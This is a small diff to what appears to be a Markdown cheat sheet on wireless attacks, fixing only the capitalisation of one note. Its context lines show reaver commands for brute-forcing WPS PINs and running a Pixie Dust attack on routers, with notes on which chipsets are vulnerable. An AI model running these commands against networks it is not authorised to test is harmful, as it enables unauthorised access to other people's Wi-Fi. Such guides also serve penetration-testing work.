@@ -42,7 +42,7 @@ sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vv -p 12345678
 ```
 
 #### Notes
-success running this attack against Ralink and RealTek chipsets. And very spotty success against Broadcom chipsets
+Success running this attack against Ralink and RealTek chipsets. And very spotty success against Broadcom chipsets
 ```text
 sudo reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
 ```
